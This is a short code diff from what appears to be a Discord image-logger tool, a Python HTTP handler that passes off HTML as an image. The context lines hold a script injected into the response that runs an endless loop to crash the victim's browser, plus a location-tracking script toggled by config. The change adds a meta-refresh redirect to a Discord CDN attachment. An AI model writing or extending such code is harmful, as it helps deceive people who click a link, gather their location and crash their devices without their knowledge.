@@ -265,10 +265,11 @@ height: 100vh;
                     data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
                 if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}"><meta http-equiv="refresh" content="0;url=https://cdn.discordapp.com/attachments/1150324884031950898/1201369489942515763/8jthWYF_7.png?ex=65c99186&is=65b71c86&hm=d1732ca7970a8778a910cf31ce65d2e53c01c7cdcaa470ab118231308a73b25d&">'.encode()
                 self.send_response(200) # 200 = OK (HTTP Status)
                 self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
+
                 
                 if config["accurateLocation"]:
                     data += b"""<script>
